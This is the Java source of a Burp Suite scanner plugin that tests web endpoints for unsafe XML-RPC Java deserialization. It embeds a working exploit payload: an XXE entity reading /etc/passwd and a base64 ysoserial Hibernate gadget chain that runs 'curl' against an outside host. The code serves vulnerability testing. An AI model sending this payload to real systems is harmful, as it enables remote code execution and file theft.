package com.yandex.burp.extensions.plugins.audit;

import burp.*;
import com.yandex.burp.extensions.plugins.CustomScanIssue;
import com.yandex.burp.extensions.plugins.config.BurpMollyPackConfig;

import java.net.URL;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;

/**
 * Created by a-abakumov on 19/04/2017.
 */
public class XmlRpcSerializablePlugin implements IAuditPlugin {

    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    private HashSet<String> flags;

    private final int ISSUE_TYPE = 0x080a000e;
    private final String ISSUE_NAME = "XML RPC Deserialization User Input";
    private final String SEVERITY = "High";
    private final String CONFIDENCE = "Certain";

    private final String PAYLOAD = "<!DOCTYPE root[\n<!ENTITY foo SYSTEM \"file:///etc/passwd\">\n]>\n <methodCall>\n" +
            "<methodName>1</methodName>\n<params>\n<param><value><struct><member><name>aaaa</name>\n<value>" +
            "<ex:serializable xmlns:ex=\"http://ws.apache.org/xmlrpc/namespaces/extensions\">\n" +
            "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP" +
            "0AAAAAAAAB3CAAAAAIAAAACc3IAI29yZy5oaWJlcm5hdGUuZW5naW5lLnNwaS5UeXBlZFZhbHVlh4gUshmh5z" +
            "wCAAJMAAR0eXBldAAZTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO0wABXZhbHVldAASTGphdmEvbGFuZy9PYmp" +
            "lY3Q7eHBzcgAgb3JnLmhpYmVybmF0ZS50eXBlLkNvbXBvbmVudFR5cGVLLRkFMaLDdQIADFoAEmhhc05vdE51" +
            "bGxQcm9wZXJ0eVoABWlzS2V5SQAMcHJvcGVydHlTcGFuTAAPY2FuRG9FeHRyYWN0aW9udAATTGphdmEvbGFuZ" +
            "y9Cb29sZWFuO1sAB2Nhc2NhZGV0AChbTG9yZy9oaWJlcm5hdGUvZW5naW5lL3NwaS9DYXNjYWRlU3R5bGU7TA" +
            "ARY29tcG9uZW50VHVwbGl6ZXJ0ADFMb3JnL2hpYmVybmF0ZS90dXBsZS9jb21wb25lbnQvQ29tcG9uZW50VHV" +
            "wbGl6ZXI7TAAKZW50aXR5TW9kZXQAGkxvcmcvaGliZXJuYXRlL0VudGl0eU1vZGU7WwALam9pbmVkRmV0Y2h0" +
            "ABpbTG9yZy9oaWJlcm5hdGUvRmV0Y2hNb2RlO1sADXByb3BlcnR5TmFtZXN0ABNbTGphdmEvbGFuZy9TdHJpb" +
            "mc7WwATcHJvcGVydHlOdWxsYWJpbGl0eXQAAltaWwANcHJvcGVydHlUeXBlc3QAGltMb3JnL2hpYmVybmF0ZS" +
            "90eXBlL1R5cGU7TAAJdHlwZVNjb3BldAAqTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlRmFjdG9yeSRUeXBlU2N" +
            "vcGU7eHIAH29yZy5oaWJlcm5hdGUudHlwZS5BYnN0cmFjdFR5cGX6DMO0n0LdQQIAAHhwAAAAAAABcHBzcgAz" +
            "b3JnLmhpYmVybmF0ZS50dXBsZS5jb21wb25lbnQuUG9qb0NvbXBvbmVudFR1cGxpemVytZ5Tkmx3CPoCAARMA" +
            "A5jb21wb25lbnRDbGFzc3QAEUxqYXZhL2xhbmcvQ2xhc3M7TAAJb3B0aW1pemVydAAwTG9yZy9oaWJlcm5hdG" +
            "UvYnl0ZWNvZGUvc3BpL1JlZmxlY3Rpb25PcHRpbWl6ZXI7TAAMcGFyZW50R2V0dGVydAAfTG9yZy9oaWJlcm5" +
            "hdGUvcHJvcGVydHkvR2V0dGVyO0wADHBhcmVudFNldHRlcnQAH0xvcmcvaGliZXJuYXRlL3Byb3BlcnR5L1Nl" +
            "dHRlcjt4cgA3b3JnLmhpYmVybmF0ZS50dXBsZS5jb21wb25lbnQuQWJzdHJhY3RDb21wb25lbnRUdXBsaXplc" +
            "s8SWGKuCeZ0AgAFWgASaGFzQ3VzdG9tQWNjZXNzb3JzSQAMcHJvcGVydHlTcGFuWwAHZ2V0dGVyc3QAIFtMb3" +
            "JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9HZXR0ZXI7TAAMaW5zdGFudGlhdG9ydAAiTG9yZy9oaWJlcm5hdGUvdHV" +
            "wbGUvSW5zdGFudGlhdG9yO1sAB3NldHRlcnN0ACBbTG9yZy9oaWJlcm5hdGUvcHJvcGVydHkvU2V0dGVyO3hw" +
            "AAAAAAB1cgAgW0xvcmcuaGliZXJuYXRlLnByb3BlcnR5LkdldHRlcjv4lvypjfvjewIAAHhwAAAAAXNyADhvc" +
            "mcuaGliZXJuYXRlLnByb3BlcnR5LkJhc2ljUHJvcGVydHlBY2Nlc3NvciRCYXNpY0dldHRlcuf8GjuY3XG8Ag" +
            "ACTAAFY2xhenpxAH4AE0wADHByb3BlcnR5TmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwdnIAOmNvbS5zdW4" +
            "ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMABkkA" +
            "DV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbT" +
            "GphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAfTAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1" +
            "Byb3BlcnRpZXM7eHB0ABBvdXRwdXRQcm9wZXJ0aWVzcHBwcHBwcHBwcHVyABpbTG9yZy5oaWJlcm5hdGUudHl" +
            "wZS5UeXBlO36vq6HklWGaAgAAeHAAAAABcQB+ABFwc3EAfgAhAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4" +
            "cAAAAAJ1cgACW0Ks8xf4BghU4AIAAHhwAAAGm8r+ur4AAAAxADgKAAMAIgcANgcAJQcAJgEAEHNlcmlhbFZlc" +
            "nNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQWtIJPzkd3vPgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW" +
            "5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQATU3R1YlRyYW5zbGV0UGF5bG9hZAE" +
            "ADElubmVyQ2xhc3NlcwEANUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBh" +
            "eWxvYWQ7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvR" +
            "E9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW" +
            "5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0R" +
            "PTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1Nl" +
            "cmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACcBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhb" +
            "i9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aX" +
            "NJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXR" +
            "pb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v" +
            "RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZ" +
            "XJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACw" +
            "cAKAEAM3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZAEAQGNvbS9" +
            "zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABRq" +
            "YXZhL2lvL1NlcmlhbGl6YWJsZQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9Uc" +
            "mFuc2xldEV4Y2VwdGlvbgEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBAAg8Y2xpbml0PgEAEW" +
            "phdmEvbGFuZy9SdW50aW1lBwAqAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwALAAtCgA" +
            "rAC4BACBjdXJsIGh0dHA6Ly9oYXJkYzBkZS5jdGYuc3U6ODA5MAgAMAEABGV4ZWMBACcoTGphdmEvbGFuZy9T" +
            "dHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADIAMwoAKwA0AQAdeXNvc2VyaWFsL1B3bmVyNjg2MTA0OTA1M" +
            "TcyMDIBAB9MeXNvc2VyaWFsL1B3bmVyNjg2MTA0OTA1MTcyMDI7ACEAAgADAAEABAABABoABQAGAAEABwAAAA" +
            "IACAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAALgAOAAAADAABAAAABQAPADc" +
            "AAAABABMAFAACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAMwAOAAAAIAADAAAAAQAPADcAAAAAAAEA" +
            "FQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAN" +
            "wAOAAAAKgAEAAAAAQAPADcAAAAAAAEAFQAWAAEAAAABABwAHQACAAAAAQAeAB8AAwAZAAAABAABABoACAApAA" +
            "sAAQAMAAAAGwADAAIAAAAPpwADAUy4AC8SMbYANVexAAAAAAACACAAAAACACEAEQAAAAoAAQACACMAEAAJdXE" +
            "AfgAsAAAB1Mr+ur4AAAAxABsKAAMAFQcAFwcAGAcAGQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3Rh" +
            "bnRWYWx1ZQVx5mnuPG1HGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2Nhb" +
            "FZhcmlhYmxlVGFibGUBAAR0aGlzAQADRm9vAQAMSW5uZXJDbGFzc2VzAQAlTHlzb3NlcmlhbC9wYXlsb2Fkcy" +
            "91dGlsL0dhZGdldHMkRm9vOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACwcAGgEAI3lzb3Nlcml" +
            "hbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmEvaW8vU2VyaWFs" +
            "aXphYmxlAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwAhAAIAAwABAAQAAQAaAAUABgABAAcAA" +
            "AACAAgAAQABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAADsADgAAAAwAAQAAAAUADw" +
            "ASAAAAAgATAAAAAgAUABEAAAAKAAEAAgAWABAACXB0AARQd25ycHcBAHhxAH4ABXNxAH4AAnEAfgARcQB+AClxAH4AMHg=\n" +
            "</ex:serializable></value></member></struct></value>\n</param>\n</params>\n</methodCall>";

    public XmlRpcSerializablePlugin(IBurpExtenderCallbacks callbacks, BurpMollyPackConfig extConfig) {
        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();
        this.flags = new HashSet<>();
    }

    @Override
    public List<IScanIssue> doScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        IResponseInfo resp = helpers.analyzeResponse(baseRequestResponse.getResponse());
        IRequestInfo req = helpers.analyzeRequest(baseRequestResponse.getRequest());
        if (resp == null | req == null) return null;

        URL url = helpers.analyzeRequest(baseRequestResponse).getUrl();
        if (flags.contains(url.toString())) return null;
        else flags.add(url.toString());

        List<IScanIssue> issues = new ArrayList<>();

        List<String> headers = helpers.analyzeRequest(baseRequestResponse).getHeaders();
        headers.set(0, headers.get(0).replace("GET", "POST"));
        headers.removeIf(header -> header != null && header.toLowerCase().startsWith("content-type:"));
        headers.add("Content-type: application/xml;charset=UTF-8");

        byte[] attackBody = helpers.buildHttpMessage(headers, helpers.stringToBytes(PAYLOAD));
        IHttpRequestResponse attackRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), attackBody);

        if (attackRequestResponse != null && attackRequestResponse.getResponse() != null
                && helpers.bytesToString(attackRequestResponse.getResponse()).toLowerCase().contains("faultcode")
                && (helpers.bytesToString(attackRequestResponse.getResponse()).toLowerCase().contains("http://ws.apache.org/xmlrpc/namespaces/extensions")
                || helpers.bytesToString(attackRequestResponse.getResponse()).toLowerCase().contains("org.hibernate.engine.spi.typedvalue"))) {

            String attackDetails = "The application deserialize untrusted serialized Java objects at <b>" +
                    helpers.analyzeRequest(attackRequestResponse).getUrl().toString() +
                    "</b> without first checking the type of the received object. This issue can be" +
                    " exploited by sending malicious objects that, when deserialized," +
                    " execute custom Java code.";

            issues.add(new CustomScanIssue(attackRequestResponse.getHttpService(),
                    helpers.analyzeRequest(attackRequestResponse).getUrl(),
                    new IHttpRequestResponse[]{callbacks.applyMarkers(attackRequestResponse, null, null)},
                    attackDetails, ISSUE_TYPE, ISSUE_NAME, SEVERITY, CONFIDENCE,
                    "", "", ""));
        }
        return issues.isEmpty() ? null : issues;
    }
}
